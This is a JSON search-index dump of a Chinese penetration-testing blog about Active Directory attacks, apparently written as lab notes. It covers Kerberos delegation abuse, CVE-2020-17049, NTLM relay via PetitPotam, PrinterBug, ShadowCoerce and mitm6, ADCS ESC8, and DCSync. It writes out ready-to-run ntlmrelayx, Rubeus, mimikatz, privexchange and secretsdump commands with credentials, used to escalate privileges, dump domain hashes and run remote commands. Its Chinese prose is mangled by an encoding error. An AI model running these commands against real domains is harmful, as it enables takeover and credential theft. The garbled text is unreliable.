TGSé€šè¿‡s4u2proxyå»è®¿é—®æœåŠ¡krbtgt/adc.comã€‚é‚£ä¹ˆè¿™å¼ ç¥¨æ®ä¸å°±æ˜¯åŸŸç®¡çš„TGTå—ã€‚ ç±»ä¼¼è¿™æ ·çš„ç»“æ„ï¼šè¿™ç§æ‰‹æ³•é€šè¿‡çº¦æŸå§”æ´¾æˆ–è€…RBCDéƒ½å¯ä»¥å®ç°ã€‚ æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸ªé…ç½®çº¦æŸå§”æ´¾æœºå™¨çš„msDS-AllowedToDelegateToå±æ€§ä¸ºkrbtgt/adc.comã€‚ æˆ–è€…è®¾ç½®krbtgtçš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ä¸ºæˆ‘ä»¬æ·»åŠ çš„æœºå™¨ã€‚ å†é€šè¿‡S4Uåè®®å³å¯è·å¾—ä¸€å¼ åŸŸç®¡çš„TGTã€‚ å…·ä½“å‚è€ƒï¼š åˆ©ç”¨ Kerberos delegation æ‰“é€ å˜ç§é»„é‡‘ç¥¨æ® ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"CVE-2020-17049 åœ¨s4u2selfé˜¶æ®µæˆ‘ä»¬æåˆ°ï¼Œè·å–å¯è½¬å‘çš„ç¥¨æ®ï¼Œéœ€è¦ æœºå™¨é…ç½®äº†çº¦æŸå§”æ´¾ ç”¨æˆ·æ²¡æœ‰è®¾ç½® â€˜æ•æ„Ÿè´¦æˆ·ï¼Œä¸èƒ½è¢«å§”æ´¾â€™ ç”¨æˆ·ä¸æ˜¯å—ä¿æŠ¤ç»„çš„æˆå‘˜ æˆ‘ä»¬ç»™administratoré…ç½®æ•æ„Ÿè´¦æˆ·ã€‚ åœ¨s4u2proxyé˜¶æ®µç”³è¯·æœåŠ¡ç¥¨æ®æ—¶æŠ¥é”™ã€‚ åŠ ä¸Š-force-forwardableæˆåŠŸã€‚ ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ ç¥¨æ®ä¸­çš„forwardableä½æ ‡å¿—ç€è¯¥ç¥¨æ®æ˜¯å¦å¯è½¬å‘ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹KDCéªŒè¯forwardableçš„æµç¨‹ï¼š s4u2selfé˜¶æ®µï¼šKDCä¼šæ£€æŸ¥æœºå™¨æ˜¯å¦é…ç½®å§”æ´¾ã€æ•æ„Ÿç”¨æˆ·å’Œæ˜¯å¦æ˜¯å—ä¿æŠ¤ç»„æˆå‘˜ ä¸æ»¡è¶³ä¸Šè¿°æ¡ä»¶forwardableä½å°±è¢«è®¾ä¸º0ã€‚è€Œs4u2selfé˜¶æ®µçš„çš„forwardableä½æ˜¯é€šè¿‡serveræœ¬èº«çš„hashåŠ å¯†çš„ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥è§£å¯†å¹¶æŠŠforwardableä½æ”¹ä¸º1ã€‚è¿™æ ·åç»­s4u2proxyæ ¡éªŒKDCå°±è®¤ä¸ºå§”æ´¾çš„ç”¨æˆ·ä¸å—ä¿æŠ¤ã€‚ é‚£ä¹ˆè¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬çŸ¥é“RBCDæ—¶s4u2selfé˜¶æ®µç”³è¯·çš„ç¥¨æ®ä¸ä¸€å®šæ˜¯å¯è½¬å‘çš„ã€‚è€Œä¸”å¤šæ•°æƒ…å†µä¸‹æ˜¯ä¸å¯è½¬å‘çš„ã€‚é‚£ä¹ˆs4u2proxyé˜¶æ®µKDCçš„éªŒè¯é¡ºåºæ˜¯æ€ä¹ˆæ ·çš„å‘¢ã€‚ Rubeusæœ‰ä¸“é—¨å¾—s4uæ¨¡å— GhostPack/Rubeus: Trying to tame the three-headed dog. (github.com) ä»¥ä¸‹æ˜¯æˆ‘ä¸ªäººæµ‹è¯•ç»“æœï¼Œä¸ä¸€å®šå¯¹ï¼š s4u2proxyé˜¶æ®µï¼š forwardable = 1ï¼š KDCé¦–å…ˆç¡®å®šä¸¤è€…æ˜¯å¦å­˜åœ¨å§”æ´¾å…³ç³»(é¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨A-\u003eBçš„çº¦æŸå§”æ´¾ï¼Œä¸å­˜åœ¨åˆ™æ£€æŸ¥æ˜¯å¦å­˜åœ¨B-\u003eAçš„RBCD)ã€‚è‹¥ä¸å­˜åœ¨å§”æ´¾å…³ç³»ï¼ŒæŠ¥é”™è¿”å›ã€‚ forwardable = 0ï¼š é¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨B-\u003eAçš„RBCDï¼Œå¦‚æœäºŒè€…å­˜åœ¨RBCDï¼Œä¼šè¿›ä¸€æ­¥æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é…ç½®äº†ä¸å¯å§”æ´¾æˆ–è€…æ˜¯å—ä¿æŠ¤ç»„çš„,è‹¥ä¸æ˜¯s4u2proxyä¾ç„¶å¯ç”¨ã€‚ è¿™é‡Œæ ¹æ®æˆ‘æœ¬åœ°çš„æµ‹è¯•ç»“æœã€‚KDCæ£€æŸ¥ç”¨æˆ·æ˜¯å¦é…ç½®äº†ä¸å¯å§”æ´¾æ—¶æ˜¯åœ¨TGS-REQè¯·æ±‚ä¸­çš„PACä¸­æ£€æŸ¥çš„ã€‚ è¿™ä¹Ÿå°±æ˜¯è¯´ä»¥ä¸‹æ”»å‡»é¡ºåºæ˜¯å¯è¡Œçš„ï¼ˆæ„Ÿè§‰ä¹Ÿæ²¡å•¥å®é™…ä»·å€¼ï¼‰ï¼š s4u2selfç”³è¯·administratorçš„TGSã€‚ è®¾ç½®administratorä¸ºå§”æ´¾è´¦æˆ·ä¸å¯å§”æ´¾ã€‚ ä½¿ç”¨ä¸Šé¢ç”³è¯·çš„TGSè¿›è¡Œs4u2proxyã€‚ æˆåŠŸè·å–ç¥¨æ®ã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"s4u2selfææƒ å‡è®¾æˆ‘ä»¬æ‹¿åˆ°ä¸€å°æœºå™¨æƒé™æ˜¯ä¸€äº›æœåŠ¡è´¦æˆ·çš„ï¼Œæ¯”å¦‚NT AUTHORITY\\NETWORK SERVICEã€iis apppool\\defaultapppool nt service\\mssqlserverè¿™ç±»æƒé™åœ¨è®¿é—®ç½‘ç»œèµ„æºæ—¶æ˜¯é€šè¿‡æœºå™¨è´¦æˆ·å»è®¿é—®çš„ã€‚ è€Œä»»æ„æœºå™¨è´¦æˆ·éƒ½å·²è¿›è¡Œs4u2selfè·å¾—ä¸€å¼ ä»»æ„ç”¨æˆ·è®¿é—®è‡ªèº«çš„æœåŠ¡ç¥¨æ®ã€‚å³ä½¿è¿™å¼ ç¥¨æ®ä¸å¯è½¬å‘ã€è¯¥ç”¨æˆ·åœ¨å—ä¿æŠ¤ç»„ä¸­ï¼Œç¥¨æ®ä¾ç„¶å¯ç”¨ã€‚ ç¤ºä¾‹ï¼š é¦–å…ˆæˆ‘ä»¬ä¸Šçº¿äº†ä¸€å°mssqlçš„æœºå™¨ï¼Œæƒé™æ˜¯mssqlserviceã€‚ æ‰§è¡Œs4u2selfä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€å¼ æœºå™¨è´¦æˆ·çš„TGTæˆ–è€…hashã€‚ Rubeus - ç°åœ¨æ‹¥æœ‰æ›´å¤šçš„KekeoåŠŸèƒ½ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com) é€šè¿‡Rubeusçš„tgtdelegåŠŸèƒ½è·å–ä¸€å¼ æœºå™¨è´¦æˆ·çš„TGTã€‚ ç„¶åé€šè¿‡s4u2selfä»£æ›¿åŸŸç®¡è·å–mssqlçš„æœåŠ¡ç¥¨æ® ç„¶åè½¬æ¢ç¥¨æ®ï¼Œç¥¨æ®ä¼ é€’ã€‚è·å¾—systemæƒé™ã€‚ ä¸ç™½é“¶é“¶ç¥¨ç›¸æ¯”ï¼Œå®ƒçš„ä¼˜åŠ¿åœ¨äºç”Ÿæˆçš„ç¥¨æ®åŒ…å«æœ‰æ•ˆçš„ PACã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:3","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"å‚è€ƒ revisiting-delegate-2-thyself Abusing Kerberos S4U2self for local privilege escalation windows protocol Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory å¾®è½¯ä¸è®¤çš„â€œ0dayâ€ä¹‹åŸŸå†…æœ¬åœ°ææƒ-çƒ‚ç•ªèŒ„ï¼ˆRotten Tomatoï¼‰ - å¥‡å®‰ä¿¡A-TEAMæŠ€æœ¯åšå®¢ (qianxin.com) ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:7:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":null,"content":"æœ€å¼€å§‹çœ‹ä¸æ‡‚çš„æ–‡ç« ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´çš„å­¦ä¹ åå†å›æ¥çœ‹æ€»ä¼šæœ‰ç§æç„¶å¤§æ‚Ÿçš„æ„Ÿè§‰ã€‚ è®°å½•è‡ªå·±çœ‹è¿‡çš„æ²¡çœ‹è¿‡çš„çš„æ–‡ç« ï¼Œä»¥ä¾¿æ—¥åå›é¡¾ã€‚ è®©å­å¼¹é£ä¸€ä¼šï¼ ADåŸŸ windows protocol NTLM - The Hacker Recipes Penetration Testing Lab â€“ Offensive Techniques \u0026 Methodologies NTLM Relay - hackndo Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory | Shenanigans Labs ã€M01Nã€‘èµ„æºçº¦æŸå§”æ´¾å’ŒNTLM Relayingçš„ç»„åˆæ‹³æ¥ç®¡åŸŸå†…ä»»æ„ä¸»æœºç³»ç»Ÿæƒé™ â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ Exploring search connectors and library files in Windows Windowsè®¿é—®æ§åˆ¶ - Windows Access Control ADåŸŸä¸­çš„ACLæ”»é˜²æ¢ç´¢ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° è¿™æ˜¯ä¸€ç¯‡â€œä¸ä¸€æ ·â€çš„çœŸå®æ¸—é€æµ‹è¯•æ¡ˆä¾‹åˆ†ææ–‡ç«  - å¥‡å®‰ä¿¡A-TEAMæŠ€æœ¯åšå®¢ å¾®è½¯ä¸è®¤çš„â€œ0dayâ€ä¹‹åŸŸå†…æœ¬åœ°ææƒ-çƒ‚ç•ªèŒ„ï¼ˆRotten Tomatoï¼‰ - å¥‡å®‰ä¿¡A-TEAMæŠ€æœ¯åšå®¢ Project Zero: Using Kerberos for Authentication Relay Attacks ç»“åˆCVE-2019-1040æ¼æ´çš„ä¸¤ç§åŸŸææƒæ·±åº¦åˆ©ç”¨åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· Abusing AD ACL - å…ˆçŸ¥ç¤¾åŒº æ¸—é€æµ‹è¯•ä¸­çš„Exchange - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° Relaying NTLM authentication over RPC againâ€¦ â€“ Compass Security Blog AD CSæ”»å‡»é¢å‰–æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· ADCS æ”»å‡»é¢æŒ–æ˜ä¸åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° å…æ€ What is ired.team? - Red Teaming Experiments å‰è¨€ - Cobalt Strike åŸºäºrpcè°ƒç”¨-åŠ¨æ€åŠ è½½ssp_rv0p111-CSDNåšå®¢ å¯¹æŠ—360æƒé™ç»´æŒ â€“ xkkhhâ€™s blog åˆ©ç”¨VEHåšå†…å­˜å¯¹æŠ— - å…ˆçŸ¥ç¤¾åŒº ç»•è¿‡å¡å·´æ–¯åŸºdumpè¿›ç¨‹lsass.exeå†…å­˜_xiangshen1990çš„åšå®¢-CSDNåšå®¢_dump lsass DLLæ³¨å…¥æ–°å§¿åŠ¿ï¼šåå°„å¼DLLæ³¨å…¥ç ”ç©¶ - h2z - åšå®¢å›­ Bypassing Signature-Based AV | Red Siege Information Security å…¶ä»– CDN 2021 å®Œå…¨æ”»å‡»æŒ‡å— ï¼ˆä¸€ï¼‰ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° ","date":"2022-02-18","objectID":"https://songzhiv.github.io/cl/:0:0","tags":null,"title":"","uri":"https://songzhiv.github.io/cl/"},{"categories":["ADåŸŸ"],"content":"æœ¬æ–‡ä¸»è¦è®²Relayçš„ä¸€äº›è·¯å¾„ï¼Œå¹¶ä¸ä¼šè®²å¤ªå¤šåŸç†æ€§çš„ä¸œè¥¿ï¼Œå¦‚æœä½ å¯¹NTLM Relayä¸å¤ªäº†è§£ã€‚é‚£ä¹ˆå¼ºçƒˆå»ºè®®é˜…è¯»ä»¥ä¸‹ä¸–çºªå¥½æ–‡ï¼š The NTLM Authentication Protocol and Security Support Provider NTLM ç¯‡ - windows protocol NTLM Relay - hackndo æœ¬ç¯‡ä¸»è¦å›´ç»•ä¸‹å›¾è¿›è¡Œã€‚æ¥è‡ª https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png \" https://www.thehacker.recipes/ad/movement/ntlm/relay ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:0:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"è§¦å‘NTLMè®¤è¯ã€‚ ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"SMB PetitPotamï¼ˆMS-EFSRï¼‰ https://github.com/topotam/PetitPotam MS-EFSR æ˜¯ Microsoft çš„åŠ å¯†æ–‡ä»¶ç³»ç»Ÿè¿œç¨‹åè®®ã€‚å®ƒå¯¹è¿œç¨‹å­˜å‚¨å¹¶é€šè¿‡ç½‘ç»œè®¿é—®çš„åŠ å¯†æ•°æ®æ‰§è¡Œç»´æŠ¤å’Œç®¡ç†æ“ä½œï¼Œå¹¶å¯ä½œä¸º RPC æ¥å£ä½¿ç”¨ã€‚è¯¥æ¥å£å¯é€šè¿‡ \\pipe\\efsrpcã€\\pipe\\lsarpcã€\\pipe\\samrã€\\pipe\\lsass å’Œ \\pipe\\netlogon SMB å‘½åç®¡é“ä½¿ç”¨ã€‚ MS-efsè§¦å‘æœºå™¨è´¦æˆ·å¼ºåˆ¶è¿”å›èº«ä»½éªŒè¯ã€‚é»˜è®¤èµ°SMBåè®®ã€‚ å¦‚æœæœºå™¨å¼€å¯lsarpcçš„åŒ¿åè®¿é—®ã€‚å³å¯åœ¨ä¸çŸ¥é“è´¦æˆ·å¯†ç çš„æƒ…å†µä¸‹è§¦å‘å¼ºåˆ¶èº«ä»½è®¤è¯ã€‚ dasimage.png \" das PrinterBugï¼ˆMS-RPRNï¼‰ https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py Microsoft çš„ Print Spooler æ˜¯ä¸€é¡¹å¤„ç†æ‰“å°ä½œä¸šå’Œå…¶ä»–ä¸æ‰“å°ç›¸å…³çš„å„ç§ä»»åŠ¡çš„æœåŠ¡ã€‚æ§åˆ¶åŸŸç”¨æˆ·/è®¡ç®—æœºçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„ RPC è°ƒç”¨è§¦å‘è¿è¡Œå®ƒçš„ç›®æ ‡çš„å‡è„±æœºæœåŠ¡ï¼Œå¹¶ä½¿å…¶å¯¹æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ­¤ç¼ºé™·æ˜¯â€œæ— æ³•ä¿®å¤â€ï¼Œé»˜è®¤æƒ…å†µä¸‹åœ¨æ‰€æœ‰ Windows ç¯å¢ƒä¸­å¯ç”¨ã€‚ å¼ºåˆ¶èº«ä»½éªŒè¯é€šè¿‡ SMB è¿›è¡Œã€‚ ä¸Šé¢æåˆ°çš„â€œå…·ä½“è°ƒç”¨â€å°±æ˜¯ RpcRemoteFindFirstPrinterChangeNotificationEx é€šçŸ¥æ–¹æ³•ï¼Œå®ƒæ˜¯ MS-RPRN åè®®çš„ä¸€éƒ¨åˆ†ã€‚ MS-RPRN æ˜¯ Microsoft çš„æ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®ã€‚å®ƒå®šä¹‰äº†æ‰“å°å®¢æˆ·ç«¯å’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„æ‰“å°ä½œä¸šå¤„ç†å’Œæ‰“å°ç³»ç»Ÿç®¡ç†çš„é€šä¿¡ã€‚ ShadowCoerce (MS-FSRVP) MS-FSRVP æ˜¯ Microsoft çš„æ–‡ä»¶æœåŠ¡å™¨è¿œç¨‹ VSS åè®®ã€‚å®ƒç”¨äºåœ¨è¿œç¨‹è®¡ç®—æœºä¸Šåˆ›å»ºæ–‡ä»¶å…±äº«çš„å·å½±å‰¯æœ¬ï¼Œå¹¶ä¿ƒè¿›å¤‡ä»½åº”ç”¨ç¨‹åºåœ¨ SMB2 å…±äº« ä¸Šæ‰§è¡Œåº”ç”¨ç¨‹åºä¸€è‡´çš„å¤‡ä»½å’Œæ•°æ®æ¢å¤ã€‚ æ»¥ç”¨çš„ä¸€ä¸ªè¦æ±‚æ˜¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå¯ç”¨â€œæ–‡ä»¶æœåŠ¡å™¨ VSS ä»£ç†æœåŠ¡â€ã€‚ https://github.com/ShutdownRepo/ShadowCoerce python3 shadowcoerce.py -d \"adc.com\" -u \"mssql\" -p \"song@2020\" 10.10.10.123 10.10.10.15 Sql Server exec master.dbo.xp_dirtree '\\\\10.10.10.123\\test' ç›®æ ‡æœºå™¨å®‰è£…webclientæ—¶ï¼Œå¯é€šè¿‡æŒ‡å®šç«¯å£è§¦å‘httpç±»å‹è®¤è¯ã€‚ exec master.dbo.xp_dirtree '\\\\kali@80/test' --http https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==\u0026mid=2247484864\u0026idx=1\u0026sn=94260cb4a4e643764f4cfd3565ae799b xp_dirtree '\\\\hostname@SSL\\test' --ssl 443 xp_dirtree '\\\\hostname@SSL@1234\\test' --ssl port 1234 xp_dirtree '\\\\hostname@1234\\test' --http ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"HTTP WEBDAV åœ¨å¼€å¯webclientï¼ˆéœ€è¦å®‰è£…webdavï¼Œå¼€å¯webclientï¼‰æ—¶ï¼Œå¯ç»“åˆPetitPotam ã€PinterBugå‘å‡ºHTTPçš„è®¤è¯ Installing WebDAV client on Windows Server 2016 â€“ TheITBros å¤–å‘HTTPç±»å‹è®¤è¯éœ€è¦åœ¨å¯ä¿¡åŸŸä¸­ï¼Œæ‰€ä»¥éœ€è¦åœ¨åŸŸå†…æ·»åŠ ä¸€æ¡DNSè®°å½•ã€‚æˆ–è€…ç«¯å£è½¬å‘åŸŸå†…æœºå™¨ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15 è¿˜æœ‰A-TEAMå¤§å“¥ä»¬æåˆ°çš„WEBDAV XXE https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe WPADé…åˆDHCPv6 https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6 https://github.com/Kevin-Robertson/Inveigh https://www.bettercap.org/installation/ https://github.com/dirkjanm/mitm6 è¿™é‡Œæˆ‘ä½¿ç”¨ç‰©ç†æœºæ¼”ç¤ºã€‚ Inveigh.exe -spooferip 192.168.52.129 sudo python3 mitm6/mitm6.py -d adc.com --interface eth0 python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ -wh wpad -6 é‚®ä»¶é’“é±¼ outlookä¸foxmail å›¾ç‰‡é¢„è§ˆåŠŸèƒ½æ”¯æŒHTTPå’ŒUNCè·¯å¾„ï¼Œå¯è§¦å‘SMBå’Œhttpç±»å‹è®¤è¯ã€‚ è·å–HTTPéœ€è¦åœ¨å¯ä¿¡åŸŸï¼Œéœ€è¦æ·»åŠ ä¸€æ¡DNSè®°å½•ã€‚ XXEä¸SSRF https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf å„ä¸ªè¯­è¨€è§¦å‘XXEå’ŒSSRFçš„å®ç°ä¸åŒã€‚åŒä¸€é—¨è¯­è¨€ä¹Ÿæœ‰ä¸åŒçš„è§¦å‘æ–¹å¼ï¼Œ åªè¦æ”¯æŒUNCè·¯å¾„éƒ½èƒ½æ‰“å›net-ntlm hash,å¦‚æœæ”¯æŒhttpçš„è¯ï¼Œå¾—çœ‹åº•å±‚å®ç°ï¼Œæœ‰äº›åº•å±‚å®ç°æ˜¯éœ€è¦åˆ¤æ–­æ˜¯å¦åœ¨ä¿¡ä»»åŸŸçš„ï¼Œæœ‰äº›åº•å±‚å®ç°æ˜¯ä¸éœ€è¦åˆ¤æ–­æ˜¯å¦ä¿¡ä»»åŸŸï¼Œæœ‰äº›éœ€è¦åˆ¤æ–­æ˜¯å¦ä¿¡ä»»åŸŸé‡Œé¢ã€‚ åœ¨xxeå’Œssrfæµ‹è¯•ä¸­ä¸€èˆ¬è¦æµ‹è¯•è¿™ä¸¤ä¸ªæ–¹é¢ æ”¯ä¸æ”¯æŒUNCè·¯å¾„ï¼Œæ¯”å¦‚\\\\ip\\xæˆ–è€…file://ip/x æ”¯ä¸æ”¯æŒHTTP(è¿™ä¸ªä¸€èˆ¬æ”¯æŒ),æ˜¯ä¸æ˜¯éœ€è¦ä¿¡ä»»åŸŸï¼Œä¿¡ä»»åŸŸæ˜¯æ€ä¹ˆåˆ¤æ–­çš„ Exchange SSRF https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#4.-cve-2018-8581 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:1:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"åŸŸå†…æœºå™¨çš„ç­¾åæƒ…å†µ æˆ‘ä»¬å¯ä»¥åœ¨ Windowsç®¡ç†å·¥å…·-æœ¬åœ°å®‰å…¨ç­–ç•¥-æœ¬åœ°ç­–ç•¥-å®‰å…¨é€‰é¡¹ ä¸­æŸ¥çœ‹ ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"LDAP LDAPä¸€èˆ¬åªå®‰è£…åœ¨åŸŸæ§ä¸Šï¼Œé»˜è®¤æ˜¯åå•†ç­¾åè€Œéå¼ºåˆ¶ç­¾åã€‚ å³å½“relayæ—¶SMBç­¾åå¼€å¯æˆ–è€…å¼ºåˆ¶ç­¾åæ—¶ï¼šéœ€è¦ç­¾å å½“SMBç­¾åå…³é—­ï¼ˆSMBv1ï¼‰æˆ–è€…HTTPçš„æµé‡æ—¶ï¼šä¸éœ€è¦ç­¾å ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"SMB åŸŸæ§ï¼šä½œä¸ºserverç«¯ï¼ŒåŸŸæ§é»˜è®¤æ˜¯å¼ºåˆ¶SMBç­¾åçš„ã€‚ åŸŸå†…æ™®é€šæœºå™¨ï¼šä½œä¸ºå®¢æˆ·ç«¯ï¼Œé»˜è®¤ä¸å¼€å¼ºåˆ¶ç­¾åï¼Œé»˜è®¤ä¸ºEnabledã€‚ ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:2:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"Relay Toï¼Ÿ ADC.com 10.10.10.10 åŸŸæ§ 10.10.10.14 ADCS 10.10.10.16 Exchange 10.10.10.12 æ™®é€šåŸŸå†…æœºå™¨ DDC.com 10.10.10.20 åŸŸæ§ 10.10.10.21 Exchange ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"ADCS ESC8 å®šä½ADCSæœåŠ¡å™¨ï¼š certutil -config - -ping åˆ©ç”¨ python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support --adcs --template DomainController Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:base64cert /domain:adc.com /dc:10.10.10.10 /ptt mimikatz lsadump::dcsync /all ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:1","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"Cred Dump æ•¬è¯·æœŸå¾… https://github.com/SecureAuthCorp/impacket/pull/1253 ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:2","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"EXEC python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:3","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"æšä¸¾ä¿¡æ¯ python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:4","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"åˆ›å»ºç”¨æˆ·ï¼ˆLDAPSï¼‰ æ·»åŠ æœºå™¨è´¦æˆ· åŸŸæœ‰ä¸ªå±æ€§ms-DS-MachineAccountQuota ä»–æ ‡å¿—ç€éç‰¹æƒç”¨æˆ·æœ€å¤šæ·»åŠ å¤šå°‘æœºå™¨è´¦æˆ·åˆ°åŸŸå†…ã€‚é»˜è®¤ä¸º10ã€‚ python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic æ·»åŠ æ™®é€šç”¨æˆ· éœ€è¦é«˜æƒé™è´¦æˆ·ï¼ˆæ¯”å¦‚è¯´åŸŸç®¡ï¼‰æ‰å¯ä»¥ï¼Œ python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:5","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"Exchange LDAP å­˜åœ¨CVE-2019-1040æ¼æ´çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä»SMB-\u003eLDAP(s)ã€‚è€Œæ— éœ€è€ƒè™‘ç­¾åçš„æƒ…å†µã€‚ Exchangeçš„æœºå™¨è´¦æˆ·æ˜¯åŸŸå†…é«˜æƒè´¦æˆ·ï¼Œå¯¹åŸŸæœ‰WriteDACLæƒé™ã€‚å³å¯ä»¥èµ‹äºˆä»»æ„ç”¨æˆ·ä¸¤æ¡ACEï¼š å¤åˆ¶ç›®å½•æ›´æ”¹ å¤åˆ¶ç›®å½•æ›´æ”¹æ‰€æœ‰é¡¹ è¿™æ ·è¯¥ç”¨æˆ·å°±å…·å¤‡äº†Dcsyncæƒé™ï¼Œä»è€Œå¯ä»¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·Hashã€‚ å½“exchangeå­˜åœ¨SSRFæ¼æ´(CVE-2018-8581)æ—¶ã€‚å¯è§¦å‘httpç±»å‹çš„NTLMè®¤è¯ã€‚ä¸éœ€è¦è€ƒè™‘ç­¾åé—®é¢˜ã€‚ python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123 10.10.10.21 ç­‰å¾…ä¸€åˆ†é’Ÿ æ²¡æœ‰SSRFæ—¶ï¼Œå¯é€šè¿‡è§¦å‘SMBç±»å‹æµé‡ç»“åˆCVE-2019-1040ç§»é™¤MICå®Œæ•´å‹æ£€éªŒ. python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --escalate-user wukong --remove-mic python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt EWS Exchangeçš„è®¤è¯ä¹Ÿæ˜¯æ”¯æŒNTLM 